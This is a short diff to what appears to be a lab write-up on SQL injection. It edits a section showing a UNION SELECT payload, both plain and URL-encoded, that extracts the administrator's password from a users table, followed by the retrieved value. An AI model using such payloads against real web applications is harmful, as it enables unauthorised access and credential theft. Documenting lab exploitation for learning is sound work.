@@ -292,8 +292,10 @@ With that, I was ready to attack:
 `UNION SELECT NULL, password FROM users WHERE username='administrator'`
 Translated to:
 `'+UNION+SELECT+NULL,+password+FROM+users+WHERE+username%3d'administrator'+--+`
-PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
 
+And just like that, the holy grail:
+```
 <tr>
     <th>cpnquymz0d5ix4x8chi1</th>
-</tr
+</tr>
+```
